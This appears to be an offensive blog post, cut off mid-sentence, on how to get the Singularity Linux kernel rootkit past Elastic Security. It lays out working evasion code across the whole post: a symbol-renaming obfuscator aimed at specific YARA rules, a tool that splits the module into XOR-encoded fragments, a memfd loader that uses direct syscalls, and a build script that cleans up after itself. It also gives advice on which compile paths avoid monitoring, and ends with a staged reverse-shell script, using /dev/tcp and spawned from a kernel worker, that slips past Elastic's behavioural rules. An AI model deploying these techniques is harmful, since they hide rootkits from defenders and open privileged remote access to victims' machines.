3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using 